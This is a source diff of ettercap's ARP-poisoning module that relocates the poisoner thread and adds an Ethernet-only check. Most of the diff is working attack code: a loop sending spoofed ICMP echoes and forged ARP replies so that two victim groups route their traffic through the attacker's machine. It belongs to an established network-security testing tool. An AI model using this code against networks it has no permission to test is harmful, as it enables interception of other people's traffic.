@@ -17,7 +17,7 @@
     along with this program; if not, write to the Free Software
     Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
 
-    $Header: /home/drizzt/dev/sources/ettercap.cvs/ettercap_ng/src/mitm/ec_arp_poisoning.c,v 1.4 2003/08/21 15:47:13 alor Exp $
+    $Header: /home/drizzt/dev/sources/ettercap.cvs/ettercap_ng/src/mitm/ec_arp_poisoning.c,v 1.5 2003/08/28 19:55:20 alor Exp $
 */
 
 #include <ec.h>
@@ -69,59 +69,6 @@ void __init arp_poisoning_init(void)
 
 
 /*
- * the real ARP POISONER thread
- */
-EC_THREAD_FUNC(poisoner)
-{
-   int i = 1;
-   struct hosts_list *g1, *g2;
-  
-   /* never ending loop */
-   LOOP {
-      
-      CANCELLATION_POINT();
-      
-      /* walk the lists and poison the victims */
-      LIST_FOREACH(g1, &group_one_head, next) {
-         LIST_FOREACH(g2, &group_two_head, next) {
-
-            /* equal ip must be skipped, you cant poison itself */
-            if (!ip_addr_cmp(&g1->ip, &g2->ip))
-               continue;
-            
-            /* 
-             * send the spoofed ICMP echo request 
-             * to force the arp entry in the cache
-             */
-            if (i == 1) {
-               send_icmp_echo(ICMP_ECHO, &g2->ip, GBL_IFACE->mac, &g1->ip, g1->mac);
-               send_icmp_echo(ICMP_ECHO, &g1->ip, GBL_IFACE->mac, &g2->ip, g2->mac);
-            }
-            
-            /* the effective poisoning packets */
-            send_arp(ARPOP_REPLY, &g2->ip, GBL_IFACE->mac, &g1->ip, g1->mac); 
-            send_arp(ARPOP_REPLY, &g1->ip, GBL_IFACE->mac, &g2->ip, g2->mac); 
-           
-         }
-      }
-      
-      /* 
-       * wait the correct delay:
-       * for the first 5 time use the warm_up
-       * then use normal delay
-       */
-      if (i < 5) {
-         sleep(GBL_CONF->arp_poison_warm_up);
-         i++;
-      } else
-         sleep(GBL_CONF->arp_poison_delay);
-   }
-   
-   return NULL; 
-}
-
-
-/*
  * init the ARP POISONING attack
  */
 static void arp_poisoning_start(void)
@@ -129,6 +76,12 @@ static void arp_poisoning_start(void)
    int ret;
    
    DEBUG_MSG("arp_poisoning_start");
+
+   /* arp poisoning only on etherenet */
+   if (GBL_PCAP->dlt != IL_TYPE_ETH) {
+      USER_MSG("FATAL: ARP poisoning works only on ethernet networks.\n");
+      return;
+   }
 
    /* create the list used later to poison the targets */
    if (GBL_OPTIONS->silent && !GBL_OPTIONS->load_hosts)
@@ -203,6 +156,58 @@ static void arp_poisoning_stop(void)
 
 }
 
+
+/*
+ * the real ARP POISONER thread
+ */
+EC_THREAD_FUNC(poisoner)
+{
+   int i = 1;
+   struct hosts_list *g1, *g2;
+  
+   /* never ending loop */
+   LOOP {
+      
+      CANCELLATION_POINT();
+      
+      /* walk the lists and poison the victims */
+      LIST_FOREACH(g1, &group_one_head, next) {
+         LIST_FOREACH(g2, &group_two_head, next) {
+
+            /* equal ip must be skipped, you cant poison itself */
+            if (!ip_addr_cmp(&g1->ip, &g2->ip))
+               continue;
+            
+            /* 
+             * send the spoofed ICMP echo request 
+             * to force the arp entry in the cache
+             */
+            if (i == 1) {
+               send_icmp_echo(ICMP_ECHO, &g2->ip, GBL_IFACE->mac, &g1->ip, g1->mac);
+               send_icmp_echo(ICMP_ECHO, &g1->ip, GBL_IFACE->mac, &g2->ip, g2->mac);
+            }
+            
+            /* the effective poisoning packets */
+            send_arp(ARPOP_REPLY, &g2->ip, GBL_IFACE->mac, &g1->ip, g1->mac); 
+            send_arp(ARPOP_REPLY, &g1->ip, GBL_IFACE->mac, &g2->ip, g2->mac); 
+           
+         }
+      }
+      
+      /* 
+       * wait the correct delay:
+       * for the first 5 time use the warm_up
+       * then use normal delay
+       */
+      if (i < 5) {
+         sleep(GBL_CONF->arp_poison_warm_up);
+         i++;
+      } else
+         sleep(GBL_CONF->arp_poison_delay);
+   }
+   
+   return NULL; 
+}
 
 /*
  * create the list of victims
